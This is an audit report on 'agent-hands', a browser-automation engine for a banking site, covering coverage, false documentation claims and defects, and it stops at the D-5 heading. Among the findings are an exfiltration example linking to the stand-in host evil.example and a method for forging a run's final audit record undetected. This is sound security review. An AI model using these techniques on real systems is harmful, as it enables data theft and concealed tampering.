# AUDIT — agent-hands

Independent read-only audit against the requirements brief in
`docs/BUILD_PLAN_CONTEXT.md` §A. Nothing in this repo was modified except this
file. No network request was made to `web-sample.interface-hiring.com`; no
discovery run was executed; `.env` was not read.

**Harness results (this machine, 2026-08-24):**

| command | result |
|---|---|
| `.venv/bin/python -m pytest` | **105 passed in 49.7s** (one earlier run: 1 failed — see D-11) |
| `.venv/bin/python -m pytest --collect-only` | **105 collected** across 11 files (89 `def test_` functions; parametrize expands to 105) |
| `.venv/bin/ruff check .` | All checks passed |
| `.venv/bin/mypy` | Success: no issues found in 33 source files |
| `.venv/bin/python evals/run_evals.py` | All 10 scenarios classified as expected; 10/10 stability; regenerated `evals/results.md` differs from the committed copy **only** in the date line and per-row latencies. Restored with `git checkout`. |
| `git status --short` | clean (only `docs/AUDIT.md` after this write) |

**Flake:** 3 further full-suite runs were clean. `test_escalation.py::test_human_fixes_blocking_state_and_hands_back` failed 1 of 4 full-suite runs and 1 of 8 isolated runs (~12–25%). `pytest-randomly` is not installed, so this is genuine timing nondeterminism, not ordering.

---

## A. REQUIREMENT COVERAGE MATRIX

Judged in the brief's stated priority order. "MERIDIAN-only" means the fixture
leg is stronger than the live leg and the requirement is assessed on MERIDIAN,
which is what the brief asked for.

### A.1 Adaptation quality (highest weight): config, not rewrite

| requirement | verdict | evidence |
|---|---|---|
| Adaptation is configuration/adapter, not a rewrite | **MET** | The engine took exactly one additive change: `SelectAction`/`OptionSelected` (`artifact.py:326-341`, `:208-216`), `surface.select_option` (`surface.py:364-383`), `replay._perform` (`replay.py:447-449`), `conditions.post_holds` (`conditions.py:109-123`), and resume-safety in `_effect_already_present` (`replay.py:658`) and `_step_post_holds` (`replay.py:873`). Every named symbol exists and handles select. This is a clean schema extension. |
| New target = new request file + entry URL | **PARTIAL** | True for the 2 capabilities that were actually discovered. 7 of 9 `generated/` artifacts have **no request file** — `capabilities/requests/` holds only 3 files (`lookup_member_balance`, `meridian_member_balance`, `meridian_sign_on`). |
| Option-level 0/1/>1 discipline inherited by `select` | **MET** | `surface.py:371-383`: 0 → `SurfaceError`, >1 → `SurfaceError` naming the count, exactly 1 → select by index. Never first-match. |
| Hidden per-transaction token handled | **MET** | Nothing reads it. `grep -rnw "_token" src/ tests/ scripts/ fixture/ capabilities/` → zero matches. The token posts natively because replay clicks the real submit control. Genuinely elegant. |
| Provider seam env-overridable | **MET** | `llm.py` reads `HANDS_BASE_URL`/`HANDS_API_KEY`/`HANDS_MODEL`. |

### A.2 Core-loop correctness

| requirement | verdict | evidence |
|---|---|---|
| Record → typed versioned artifact → deterministic replay | **MET** | `artifact.py` (593 lines of schema + 5 load-time integrity validators), `replay.py` (1016 lines), verified by running README steps 3 and 4 against the offline fixture: exact documented outputs. |
| No model in the replay decision loop | **MET** | `tests/test_zero_llm.py` (fresh subprocess, keys stripped, non-loopback sockets blocked) + `tests/test_api_boundary.py` (subprocess `sys.modules` check). `cli._discover` imports discovery lazily (`cli.py:260`). This is the strongest verified claim in the repo. |
| Identity-bound checkpoint (right record, not just a record) | **MET** | `artifact.py:530-536` refuses a parameterized capability whose checkpoint binds no param; `values.value_bound_in` is boundary-anchored so `123` cannot satisfy a page showing `12345`. |
| Locator ladder: 0 → next rung, >1 → hard failure, visible-only | **MET** | `surface.py:259-271`, `_visible` at `:417-433`, `_innermost` at `:436-459`, geometric tie returns **all** tied candidates so `resolve()` refuses (`:330-337`). Correct and unusually disciplined. |
| Every element fingerprint-verified | **CLAIMED-BUT-NOT-MET** | `surface.py:268` verifies only `if target.fingerprint is not None`. Across all 10 artifacts, **every** `regions.*` ladder and **every** `outputs.*.from` ladder has `fingerprint: null` — 38 unverified ladders vs 79 verified. See D-6. |
| 3.1 Record a capability per function **via the discovery loop** | **PARTIAL — the headline gap** | Of 7 required functions, exactly **1** (`meridian_member_balance`) was genuinely LLM-discovered. Provenance forensics below. |

**3.1 provenance, per capability** (`provenance:"discovered"` is emitted only by `recorder.py:313`; a `discover-<name>` run dir containing `discovery_distilled` is the only proof of a successful discovery):

| artifact | verdict | evidence |
|---|---|---|
| `generated/lookup_member_balance.json` | **LLM-DISCOVERED** (fixture) | 4 successful discover runs, e.g. `runs/20260814T204546Z-discover-lookup_member_balance-23ab4a`; condition `provenance:"discovered"`; matches `evidence/artifact.json`. |
| `generated/meridian_member_balance.json` | **LLM-DISCOVERED** (live) | `runs/20260820T181110Z-discover-meridian_member_balance-4858fc` → `discovery_distilled steps=7 outputs=[checking_balance]`; `runs/20260820T184257Z-...-member_not_found-5b4d8a` → `cond_member_not_found armed_after=s6`. Both match the artifact exactly. (8 of its 12 discover run dirs are failed attempts.) |
| `generated/meridian_sign_on.json` | **HAND-AUTHORED BY SCRIPT** | `scripts/build_capabilities.py:176`; regenerating the script's dict in memory is byte-identical to the file. Its one discovery attempt (`runs/20260820T170740Z-discover-meridian_sign_on-f6820e`) ends at `planner_done` with **no** `discovery_distilled` — discovery **failed**. |
| `generated/meridian_member_lookup_by_name.json` | **HAND-AUTHORED BY SCRIPT** | `build_capabilities.py:190`; byte-identical regeneration; no discover run; no request file. |
| `generated/meridian_account_inquiry.json` | **HAND-AUTHORED BY SCRIPT** | `build_capabilities.py:221`; ditto. |
| `generated/meridian_open_new_share.json` | **HAND-AUTHORED BY SCRIPT** | `build_capabilities.py:241`; ditto. |
| `generated/meridian_update_contact.json` | **HAND-AUTHORED BY SCRIPT** | `build_capabilities.py:299`; ditto. |
| `generated/meridian_place_hold.json` | **HAND-AUTHORED BY SCRIPT** | `build_capabilities.py:342`; ditto. |
| `generated/meridian_funds_transfer.json` | **HAND-AUTHORED DIRECTLY IN JSON** | **Not in the script at all** (its section comments run 1,2,3,**5**,6,7 — transfer was never added). Born whole in commit `dc14dce` (+712 lines) before `build_capabilities.py` existed; later hand-edited in-JSON (`8a8f9e2` +22, `a9aa7db` +49). Steps s1–s6 are byte-copies of the discovered prefix. |
| `capabilities/lookup_member_balance.json` (top level) | **HAND-AUTHORED DIRECTLY** | Added in the repo's first capability commit `988cbdb`, before discovery existed. All 5 conditions `authored`. |

Net: **2 of 10 discovered; 6 authored by script; 2 authored directly.** Both
brief MUST-HAVEs are covered — but only `balance` was discovered; `transfer`
was hand-written JSON.

**Is that represented honestly?** Mostly, with one material shortfall.
`docs/ADAPTATION.md:40-42` says plainly *"Adding five more functions took zero
engine changes: `scripts/build_capabilities.py` authors them through the
schema"* and marks only `meridian_member_balance` as **discovered**
(`:50`). That is honest. What is **not** disclosed anywhere:
(a) the script authors **six**, not five; (b) `meridian_funds_transfer` — one
of the two MUST-HAVEs — was authored **directly in JSON**, outside the script,
so the "authored through the schema" framing does not cover it; (c) the
`meridian_sign_on` discovery run **failed** and the shipped artifact is the
script's substitute. Against that, `README.md:42` ("**All 7 target functions
live**") and `ADAPTATION.md:38` ("the full 7-function registry, all
live-verified") read, in isolation, as if all seven came through the loop.

### A.3 Robustness / error handling — exceptional states

The brief names six injectable kinds plus five natural errors, and MUSTs the
business / recoverable / hard distinction, "report each deliberately".

| brief state | verdict on MERIDIAN | evidence |
|---|---|---|
| validation 400 | **MET** | `VALIDATION_REJECTED` in `meridian_funds_transfer` + `meridian_open_new_share`, region-scoped recognizers. |
| notfound 404 | **MET** | `MEMBER_NOT_FOUND` in `meridian_member_balance` (discovered), `meridian_account_inquiry`, `meridian_member_lookup_by_name`. |
| permission 403 | **PARTIAL** | Covered only as the natural `SUPERVISOR_REQUIRED` in `meridian_place_hold`. No recognizer for the injected 403 page. |
| timeout 440 / idle timeout | **PARTIAL** | One `cond_session_expired` recoverable, on `meridian_account_inquiry` only (1 of 8 capabilities). The other 7 fail hard on session expiry. |
| maintenance 503 | **MISSING** | No recognizer in any MERIDIAN artifact. |
| server 500 | **MISSING** | No recognizer in any MERIDIAN artifact. |
| bad login | **MISSING** | `meridian_sign_on` declares **zero** outcomes and **zero** conditions. A wrong password is a hard FAILURE, not a business outcome. |
| invalid email/phone | **MISSING** | `meridian_update_contact` declares **zero** outcomes and **zero** conditions, yet its `s12` is risky. Server-side rejection of a bad email is a hard FAILURE. |
| overdraw | **PARTIAL** | Folded into `VALIDATION_REJECTED`; not distinguished as its own code. |
| hold-by-non-supervisor | **MET** | `SUPERVISOR_REQUIRED`, region-anchored on `outcome_supervisor`. |
| **Distinguish business vs recoverable vs hard, deliberately** | **PARTIAL** | The *mechanism* is excellent and fully exercised on the **fixture** (5/5 recognizers, 10/10 eval scenarios). On **MERIDIAN** the recognizer inventory is 6 business outcomes + 1 recoverable across 8 capabilities, so most exceptional states land in the "hard failure" bucket by default rather than by deliberate classification. |
| `?inject=` recognizers | **MISSING** (all six) | `grep -rn "inject" src/ capabilities/ scripts/` finds no fault-kind recognizer. `ADAPTATION.md:100-102` and `:139-140` admit this for four kinds honestly; the admission does not cover bad-login or invalid-contact, which are natural errors, not injected ones. |

### A.4 API contract (3.2)

| requirement | verdict | evidence |
|---|---|---|
| Callable catalog, invoke by name, typed args → structured result | **MET** | `api.py:135` `/capabilities`, `:142` `/capabilities/<name>`, `:156` `POST /capabilities/<name>/invoke`. `?format=tools` projects OpenAI tool definitions (`:78-96`). Envelope carries `effective_artifact_sha256` and `run_dir`. Status map at `:38-44` is correct (business outcome = 200). |
| Credentials never in the request body | **PARTIAL** | `api.py:175-179` overrides sensitive params from `HANDS_PARAM_<NAME>` — but only `if env is not None`. With the env var unset, a body-supplied sensitive value passes through verbatim; nothing rejects it. `ARCHITECTURE_DEEPDIVE.md:353-358` states this bound honestly; `ADAPTATION.md:87-88` states it absolutely. |
| Idempotency | **CLAIMED-BUT-NOT-MET** under concurrency | Check-then-act race, see D-2. |

### A.5 Demoability (3.4, 3.6)

| requirement | verdict | evidence |
|---|---|---|
| 3.3 thin chatbot → capability invocation, plain-language result | **MET** | `chatbot/app.py:84-144`: fetches tool schemas from the API, one LLM call selects capability + args, invokes over HTTP, renders the 5-way result. `no_capability`/`ask_clarification` let it decline. It calls the API — it does not import the engine. |
| 3.4 dashboard: catalog, run history, inputs/outputs, status, evidence | **MET (functionally)** | `dashboard/app.py` 494 lines, all five present, plus contract-drift VERIFIED/DRIFTED and step timings. |
| 3.6 demoable end-to-end incl. ≥1 exceptional state, ideally 1 escalation | **MET locally, UNVERIFIABLE FROM A CLONE** | The local `runs/` tree holds real MERIDIAN evidence — `hands explain 20260821T092159Z-meridian_funds_transfer-754f17` produces a genuine receipt showing a real signed transfer. But `runs/` is gitignored and `evidence/` contains **only** Fairview fixture runs. See D-5. |
| Fresh-clone demoability | **NOT MET** | The dashboard reads only `runs/` (`dashboard/app.py:238`), which is gitignored, so a clone renders an empty dashboard with all-zero trust stats — including a vacuous "0 AI calls ✓". |

### A.6 Safety / PII (3.5)

| requirement | verdict | evidence |
|---|---|---|
| Route allowlist preserved through the wrapper | **PARTIAL** | The wrapper does go through the engine (verified: no `hands.replay`/`WebSurface`/`ReplayEngine` import in `dashboard/` or `chatbot/`). But the allowlist itself is page-scoped, not context-scoped — D-3. |
| Risky-action conservatism preserved | **MET** | `replay.py:153-163` returns `POLICY_VIOLATION` for unattended risky replay without a valid signed review; reached identically via the API. `replay.py:390-394` makes only `safe` steps retryable. |
| No secrets/PII | **PARTIAL** | Masking is applied to trace params (`replay.py:181`), trace results (`:236`), output values (`:960`), action text (`:994`), and intervention payloads (`:696`). It is **not** applied to: API response bodies (by design — `api.py:193` returns the real balance to an authorized caller), failure screenshots, accessibility snapshots, or the dashboard's rendering of either. See D-8. |
| Evidence | **MET** for the fixture, **absent from git** for MERIDIAN. |
| **Escalation THROUGH the wrapper** | **NOT MET** | `api.py` has exactly three routes; none concerns interventions. It constructs `EngineConfig(runs_dir=...)` with `escalation=None` (`api.py:133`), so `replay.py:681` always re-raises `_StepFailed` — the escalation state machine is **unreachable** through the API. The operator console is the only door and only `hands replay --attended` opens it. See D-7. |

### A.7 Escalation (as a mechanism)

| requirement | verdict | evidence |
|---|---|---|
| Control-token state machine, single owner | **MET** | `escalation.py:41-175`. Guards are in the hub, not the UI: `take()` requires PAUSED (`:108`), HANDBACK/ABORT/RESOLVE require HUMAN (`:124`), APPROVE requires PAUSED (`:126`). The console never touches Playwright. |
| Four attributed exits | **MET** | `Decision` enum `:47-53`; RESOLVE with an undeclared code stays parked (`replay.py:777-779`). |
| TTL fail-safe | **MET** | `replay.py:763`, `:781-790`. Deadline computed once at park and never extended. |
| Resume scan, refuses blind risky retry | **MET, with a caveat** | `replay.py:832-862`. Caveat in D-10. |
| Redaction canary / evidence suppression in the human window | **MET** | `replay.py:222-225`. |

### A.8 Communication

| requirement | verdict | evidence |
|---|---|---|
| "SAY what you cut and why" | **MET** | `ADAPTATION.md:134-146`, `REPORT.md:156-169`, `CLAUDE.md:173-198` are unusually candid, and `ARCHITECTURE_DEEPDIVE.md:578-618` volunteers the console-auth and tamper-evidence limits. |
| A reviewer can read the requirements | **NOT MET** | `docs/BUILD_PLAN_CONTEXT.md` is gitignored (`.gitignore:18`). No committed file reproduces the brief. `DESIGN_DOC.md:100-116` maps §3.x to files and `ADAPTATION.md` paraphrases the 7 functions, so a reviewer gets a paraphrase authored by the candidate, never the original. |
| Internal doc consistency | **NOT MET** | Taxonomy arity is stated three ways: "three-way" (`DESIGN.md:13`, `:487`; `DEFENSE.md:193`) vs "five-way" (`DESIGN_DOC.md:62`, `CLAUDE.md:28`). Injected-state counts: "six" (`DESIGN.md:444`) vs "10" (`DESIGN_DOC.md:214`). The catalog API is called future work (`DESIGN_DOC.md:163`, `:235-236`; `REPORT.md:168-169`) while `api.py` ships it. |

---

## B. CLAIM-VS-TRUTH TABLE

Only falsifiable claims where the verdict is not VERIFIED are listed in full;
a closing block records the significant claims that **are** verified, because
those are the ones worth keeping.

| claim (file:line) | verdict | what decides it | minimal exact replacement |
|---|---|---|---|
| "85 tests" — `README.md:128`, `CLAUDE.md:46`, `docs/DESIGN_DOC.md:204` | **FALSE** | `pytest` reports `105 passed`; `--collect-only` reports 105. | `105 tests` |
| "every element is fingerprint-verified" — `docs/ADAPTATION.md:95` | **FALSE** | `surface.py:268` verifies only when `fingerprint is not None`; all 10 artifacts have `fingerprint: null` on every region and every output source. | "every **step target** carries a fingerprint verified at resolution; region and output ladders currently do not" |
| "every target records a fingerprint (role, editability, **region**)" — `docs/DEFENSE.md:111-112` | **FALSE** (two ways) | `Fingerprint` has exactly `role` and `editable` (`artifact.py:114-120`) — no region. And output/region targets record none. | "step targets record a fingerprint (role, editability) verified at resolution" |
| "mismatch failing hard **on risky steps**" — `docs/DEFENSE.md:112` | **FALSE (understated)** | `surface.py:339-354` raises `FingerprintMismatch` regardless of risk. `DESIGN.md:183-187` states this correctly. | "mismatch fails the resolution outright, whatever the step's risk class" |
| "the CSS rung is disabled entirely when the replay tenant differs from the recording tenant" — `docs/DEFENSE.md:112-113`; same in `DESIGN.md:178-181`, `artifact.py:80` | **FALSE** | There is no tenant identity at replay. `grep -rn "tenant" src/hands/` returns exactly one hit — a docstring. Nothing disables any rung. | "*(designed)* cross-tenant replay would disable the CSS rung; tenant identity does not exist at replay today" |
| "context-wide request routing: clicks, redirects, popups, subresources" — `REPORT.md:133-136`; "`context.route` … covers redirects, popups, and iframes, context-wide" — `DESIGN.md:362-364`; "`page.route(\"**/*\", enforce)` at context creation covers … popups" — `ARCHITECTURE_DEEPDIVE.md:566-568`; same comment at `surface.py:194-196` | **FALSE** | `surface.py:197` is `self._page.route("**/*", enforce)` — page-scoped. No `context.route`, no `on("popup")`, no `on("page")` anywhere. | "page-scoped request routing covers navigations, redirects, subresources and iframes of the driven page; a popup or new tab would not be covered" |
| "an `idempotency_key` suppresses duplicate execution (a retried transfer returns the original envelope, executed exactly once — tested)" — `docs/ADAPTATION.md:71-72`; "a repeated key executes **exactly once**" — `ARCHITECTURE_DEEPDIVE.md:384-388` | **OVERCLAIM** | True for sequential retries (which is what the test covers). False for concurrent ones: the lookup at `api.py:166` is outside the lock taken at `:182`. | "a **sequentially** retried transfer returns the original envelope; the key is not yet reserved atomically, so two concurrent requests with the same key can both execute" |
| "Any naive edit, removal, insertion, or reordering breaks the chain" — `src/hands/trace.py:9-10`; "It defeats naive edits, deletions and reordering — which is what it claims" — `ARCHITECTURE_DEEPDIVE.md:612-618` | **FALSE** for the highest-value record | Executed: rewriting the **last** record's `result` in place leaves `verify_chain` → `True`. So does truncating the tail. | "Any naive edit, removal, insertion or reordering of a **non-final** record breaks the chain. The final record is unprotected: it can be rewritten in place, and tail truncation is undetectable — both need an external anchor." |
| "the escalation state machine" is preserved by the API/chatbot/dashboard — `docs/ADAPTATION.md:106-108` | **FALSE** | `api.py:133` passes no `EscalationSettings`, so `replay.py:681` always re-raises; there is no intervention endpoint. | "replay still enforces the network allowlist, the risk gate and secret masking. Escalation is **not** reachable through the API — attended runs are CLI-only (`hands replay --attended`)." |
| "before **any** re-act on any step, the engine probes for the action's effect (current postconditions, **then a forward scan of later steps' conditions and the checkpoint**)" — `docs/DEFENSE.md:69-72`; same in `DESIGN.md:265-270` | **FALSE** | `replay.py:649-662` checks only the *current* step's postconditions, and returns `False` outright if any is `ValueMatchesParam`/`OptionSelected`. There is no forward scan and no checkpoint probe. | "before any re-act, the engine probes the current step's state postconditions and re-acts only if the effect is provably absent; the forward scan is used on hand-back resume, not on retry" |
| "All 7 target functions live … every artifact signed and **live-verified**" — `README.md:42-46`; "the full 7-function registry, all live-verified" — `ADAPTATION.md:38` | **UNVERIFIABLE OFFLINE** (and misleading as to provenance) | All 9 artifacts are signed and hash-valid — that part is VERIFIED. "Live-verified" rests entirely on `runs/`, which is gitignored; `evidence/` contains zero MERIDIAN records. | "All 7 target functions have signed capability artifacts. One (`meridian_member_balance`) was LLM-discovered against the live site; the rest were authored through the schema from its verified prefix. Live run evidence is in `runs/` locally and is **not committed**." |
| "genuine LLM-driven discovery is in `/evidence/`" — `README.md:32-33` | **VERIFIED but fixture-only** | `evidence/discovery-run/` is a real Groq-served discovery transcript — for `lookup_member_balance` on the **Fairview fixture**. No MERIDIAN transcript is committed. | add "(fixture leg; the MERIDIAN discovery transcript is not committed)" |
| "`meridian_member_balance` … returning the correct checking balance verified against the live page" — `ADAPTATION.md:17-19` | **UNVERIFIABLE OFFLINE** | Only checkable against the live site or an uncommitted run. | prefix "as of 2026-08-20," and cite the run id |
| "an ambiguous share ('Money Market', 11 matching options) … paused the run and raised an intervention" — `ADAPTATION.md:65-69` | **UNVERIFIABLE OFFLINE** | The mechanism is real (`surface.py:378-382`) and a matching local run exists, but no committed evidence. | cite the run id and note it is not committed |
| "maker-checker … the author of a risky flow cannot approve their own steps" — `ADAPTATION.md:112-115`; "maker-checker four-eyes on risk sign-off" — `README.md:57-58` | **OVERCLAIM** | The guard exists (`artifact.py:570-574`) but `recorded_by` is `null` in **all 10** artifacts, so `same_operator` returns `False` unconditionally (`:540-545`) and the control cannot fire. All 9 risky artifacts are signed by the single name `ashish`. | "risk sign-off binds maker and checker identities into the signed hash. The separation-of-duties half is **inert on every shipped artifact**: `HANDS_OPERATOR` was never set at discovery, so `recorded_by` is null and every artifact is effectively self-approved." |
| "discovery stamps the recording operator from `HANDS_OPERATOR`" — `ADAPTATION.md:112-115` | **OVERCLAIM** | The code path exists (`discover.py:218-222`) but was never exercised. | "discovery stamps the recording operator **when `HANDS_OPERATOR` is set**; it was not set for the committed artifacts" |
| "secrets are … masked in **every** trace, result and transcript" — `ARCHITECTURE_DEEPDIVE.md:360-361` | **CONTRADICTED IN-DOC** | `api.py:193` returns the real `ReplayResult`, so a sensitive output reaches the HTTP body unmasked. `ARCHITECTURE_DEEPDIVE.md:594-598` states this correctly. | "masked in every trace, persisted transcript, and dashboard view; the invoke envelope returns sensitive outputs in full to the authorized caller" |
| "**three-way** taxonomy" — `DESIGN.md:13`, `:32`, `:487`; `DEFENSE.md:193` | **FALSE** | `results.py:76-79` is a five-member discriminated union. | "five-way" |
| "six injected runtime states" — `DESIGN.md:444` vs "10 injected runtime states" — `DESIGN_DOC.md:214`, `README.md:30-31` | **INCONSISTENT** | `evals/results.md` has 10 scenario rows, of which 8 are injected states and 2 are happy paths. | "10 eval scenarios covering 8 injected runtime states" |
| "**③ Gap:** no capability catalog / callable API" — `DESIGN_DOC.md:163`; "Future: a capability-catalog endpoint" — `:235-236`; "Next, in order: … a capability catalog endpoint" — `REPORT.md:166-169` | **STALE / FALSE** | `api.py` ships it. | delete the gap/future entries |
| "the Surface registers a dialog handler and exposes them as a first-class condition kind" — `DESIGN.md:271-276`; "JS dialogs during HUMAN state are relayed to the console with Accept/Dismiss buttons" — `DESIGN.md:340-343` | **FALSE (present tense for unbuilt work)** | No `on("dialog")` anywhere. `CLAUDE.md:189` and `DESIGN_DOC.md:72` say correctly that it is not built. | reword to "*Designed, not built:* the Surface would register …" |
| "Type-actions carry `{param:name}` or `{secret:ENV_VAR}`" — `DESIGN.md:378-381` | **FALSE** | Only `{param:name}` exists (`values.py`). `CLAUDE.md:190-191` admits this. | drop `{secret:ENV_VAR}` or mark it designed |
| "Approval at invocation is per step (`approve: [\"s7\"]`)" — `DESIGN.md:370-377` | **FALSE** | No such flag in `cli.py`/`replay.py`. `CLAUDE.md:194-195` admits this. | mark designed |
| "Taint-based masking, by element identity … masked, not suppressed" — `DESIGN.md:384-391` | **FALSE (present tense)** | `replay.py:222-225` suppresses wholesale; no Playwright `mask=` anywhere. Admitted at `DEEPDIVE:281-288`. | mark designed |
| "Browser-level events (navigation, popup, download, new tab) are captured via Playwright events; on hand-back … the engine adopts it explicitly or fails" — `DESIGN.md:337-340` | **FALSE** | No such handlers exist. | mark designed |
| "every replay appends … to a per-capability health file; a threshold rule … flips `needs_rediscovery`" — `DESIGN.md:431-435` | **FALSE (present tense)** | `grep needs_rediscovery src/` → nothing. | mark designed |
| "the loop is a couple hundred lines" — `DESIGN.md:502` | **FALSE** | `planner.py` is 617 lines. | "about six hundred lines" |
| "Components … **Policy**" — `DESIGN.md:39-42`; "the allowlist lives in policy config owned by the Policy component" — `DESIGN.md:367-369` | **FALSE** | There is no `policy.py`. Policy is `PolicySettings` (`replay.py:89-99`) + the route hook in `surface.py`. `DESIGN_DOC.md:108-109` says this correctly. | "Policy (a settings dataclass in `replay.py` plus the route hook in `surface.py`)" |
| "the eval table reports the verified/unverified split" — `DEFENSE.md:21`, `DESIGN.md:229-237` | **FALSE** | `verified_by_eval` is `false` on **all 14 conditions in all 10 artifacts**; the eval report has no verified/unverified column. It does print "Recognizers exercised: 5/5". | "the eval report states how many recognizers were exercised; the artifacts' `verified_by_eval` flag is not yet written back" |
| "Demo path (60 seconds)" — `README.md:87` | **OVERCLAIM** | Step 1 is a live LLM discovery run; steps 2–6 alone took ~90s here including two Playwright launches. | "Demo path (~3 minutes; skip step 1 for ~60 seconds)" |
| "See REPORT §4" / "(REPORT §7)" — `README.md:157`, `:170` | **UNRESOLVABLE** | `REPORT.md` has unnumbered headings. | name the heading instead |
| "The evidence folder has a live captured handoff ending in SUCCESS" — `DEFENSE.md:211` | **VERIFIED (fixture)** | `evidence/escalation-run/` has `intervention-1.json`, `failure.png`, `failure-a11y.txt`, chained trace. Fairview, not MERIDIAN. | add "(fixture)" |
| "the engine polls the request flag on every tick of its existing poll loop **and at every step boundary**" — `DESIGN.md:309-311`; "acknowledgment latency is bounded by one poll interval" — `DESIGN.md:313`, `DEFENSE.md:145-146` | **OVERCLAIM** | `_poll_recognizers` is called from 3 sites (`replay.py:375`, `:477`, `:901`) — not from `_check_requires` or `_run_recovery`, and not at step boundaries. Latency is one tick **plus the in-flight action** (up to Playwright's uncapped 30s on `goto`). `DEEPDIVE:149-170` states both bounds correctly. | adopt the DEEPDIVE wording |
| "an unrecognized native dialog is … deterministically dismissed" — `DESIGN.md:271-276` | **FALSE** | Nothing handles dialogs; Playwright auto-dismisses by default, which is accidental, not engineered. | mark designed |

**Significant claims that ARE verified — keep these exactly as written:**

- "no model in the decision loop, proven by test" (`README.md:7`) — `tests/test_zero_llm.py` + `tests/test_api_boundary.py`. The subprocess-based API purity test is genuinely rigorous.
- "0 matches → next rung; >1 → hard failure … uniqueness counted over visible only" (`DESIGN.md:157-160`) — `surface.py:259-271`, `:417-433`.
- "A geometric tie is ambiguity and fails; DOM order never breaks a tie" (`DESIGN.md:172-177`) — `surface.py:330-337` returns all tied candidates so `resolve` refuses. Correct and rare.
- "innermost match wins when matches nest" (`DESIGN.md:170-171`) — `surface.py:436-459`.
- "load-time validation refuses a capability whose checkpoint references no parameter" (`DESIGN.md:121-124`) — `artifact.py:530-536`.
- "outcome closure both ways" (`REPORT.md:42-44`) — `artifact.py:448-460`.
- "a comma-decimal rendering fails rather than parsing 100× wrong" (`REPORT.md:40-42`) — `values.parse_money` + `tests/test_values.py` (26 tests).
- "identity matching is boundary-anchored, never bare substring" (`DESIGN.md:123-126`) — `values.value_bound_in`.
- "risky steps are never auto-retried" (`DEFENSE.md:68`) — `replay.py:390-394`.
- "risky steps refuse unattended replay unless a human signed the artifact, bound to the artifact hash — edit one step and approval is void" (`DEFENSE.md:232-234`) — `artifact.py:548-585` + `replay.py:153-163`. Verified: all 9 signatures are currently hash-valid.
- "This system does not scrape the hidden token" (`DEEPDIVE:424-438`) — verified by grep, zero matches.
- "the console never touches Playwright" (`DEFENSE.md:147-149`) — verified by grep.
- "`RESOLVE` with an undeclared code stays parked" (`DEEPDIVE:230-233`) — `replay.py:777-779`.
- "the operator console is unauthenticated … the operator identity is a self-asserted form field" (`DEEPDIVE:578-585`) — correct and volunteered.
- "'Tamper-evident', not tamper-proof … the chain is keyless" (`DEEPDIVE:612-618`, `trace.py:10-16`) — correct, except for the final-record hole.
- "the invoke envelope serializes the real `ReplayResult`, so a sensitive output reaches the authorized caller in full" (`DEEPDIVE:594-598`) — correct.
- "`_resume_scan` scans in REVERSE … refuses a blind risky retry" (`DEEPDIVE:251-265`) — `replay.py:849-861`. Note this contradicts the "forward scan" wording in `DEFENSE.md:125` / `DESIGN.md:351-358`; the DEEPDIVE is right.
- Eval table: 10/10 scenarios classified as expected, 10/10 stability — reproduced on this machine.

---

## C. DEFECTS

Ordered by blast radius. `CONFIRMED` = I executed or traced it end to end.

### D-1 · HIGH · `src/hands/trace.py:42-61` (claim at `:9-10`) — the hash chain does not protect the final record, which is the one that carries the result

Each record's `prev` pins its *predecessor*. Nothing pins the last line, so the
terminal `run_finished` record — the one holding the result and outputs — can be
rewritten in place with `seq`/`prev` untouched and `verify_chain` still returns
`True`.

**Failure scenario (executed):** take any failed run. Rewrite the last line's
`result` from `{"result":"failure","report":{...}}` to
`{"result":"success","outputs":{"savings_balance":"999999.00"}}`, changing
nothing else. `verify_chain(run_dir)` → `True`. `hands explain` prints
`Audit log: TAMPER-EVIDENT: intact (hash chain verifies)` and
`dashboard/app.py:171` renders "Log tamper-evident ✓" beside the fabricated
success. Truncating the tail (4 records → 2) also returns `True`.

Truncation and keyless rewrite are honestly documented at `trace.py:10-16`. The
**in-place final-record edit is not**, and it is the cheapest and most valuable
forgery available. `tests/test_audit_controls.py:45-52` edits `lines[2]` — a
middle record — so the test suite has exactly this blind spot.
**Verdict: CONFIRMED.**

### D-2 · HIGH · `src/hands/api.py:166` vs `:182` — idempotency is check-then-act, so two concurrent retries of a transfer both execute

The `(name, idem_key)` lookup happens at `:166`, **outside** `_INVOKE_LOCK`
(taken at `:182`); the reservation write happens at `:197`, **after** the lock
has been released. Flask's server is threaded by default.

**Failure scenario:** a client double-submits `POST
/capabilities/meridian_funds_transfer/invoke` with `{"idempotency_key":"abc",
"params":{"amount":"500",...}}`. Both requests reach `:166`, both miss the
empty `completed` map, both proceed. They serialize on `_INVOKE_LOCK` and run
one after the other. **$500 is transferred twice.** The second response carries
a different `run_dir` and no `idempotent_replay` flag. The mechanism the docs
present as the guard against "a nervous retry" fails precisely under a nervous
retry (double-click, client timeout + retry, load-balancer retry).
**Verdict: CONFIRMED (prior #9 confirmed).**

### D-3 · HIGH · `src/hands/surface.py:197` — the network allowlist is page-scoped; a popup or new tab escapes it entirely and silently

`self._page.route("**/*", enforce)` attaches to the single `Page`. Iframes,
subresources, redirects and clicks on that page are covered. A `target="_blank"`
link or `window.open()` creates a **new** `Page` in the same `BrowserContext`
with **no** route handler. There is no `context.route`, no `on("popup")`, no
`on("page")` anywhere in `src/`.

**Failure scenario:** MERIDIAN (or an injected/compromised page) opens
`<a target="_blank" href="https://evil.example/exfil?m=100234">`. The new page
loads unrestricted. `surface.blocked_requests` stays empty, so no
`POLICY_VIOLATION` and no `policy_blocked_requests` trace line — the run
completes SUCCESS and the audit log shows nothing. The engine keeps driving
`self._page`, so the escape is also invisible to the flow. The one-word fix
(`self._page.context.route(...)`) is what four separate docs already claim is in
place. **Verdict: CONFIRMED (prior #7 confirmed).**

### D-4 · HIGH · `src/hands/replay.py:208-217` — any step failure is relabelled `POLICY_VIOLATION` if *any* request was ever blocked, and loses its evidence

The `except _StepFailed` arm checks `if surface.blocked_requests:` with no
causal link to the failure, fabricates the detail string "the flow could not
proceed", and `return`s **before** `capture_evidence` runs.

**Failure scenario:** the target page references a font or analytics beacon on a
CDN. It is blocked at step 1 (correctly). At step 9 a genuine locator drift
causes `TargetNotFound`. The caller receives
`policy_violation / off_allowlist_traffic / "blocked 1 request(s) outside the
allowlist, e.g. https://fonts.gstatic.com/…; the flow could not proceed"` with
HTTP **409** instead of `failure` with **422** — a false causal claim, the wrong
status class, and **no screenshot or accessibility snapshot** for the real
defect. Since `ADAPTATION.md:42-43` says failure snapshots doubled as the
reconnaissance loop, this silently removes that loop on any page with a
third-party subresource. **Verdict: CONFIRMED.**

### D-5 · HIGH · repo layout — every MERIDIAN claim is unverifiable from a clone

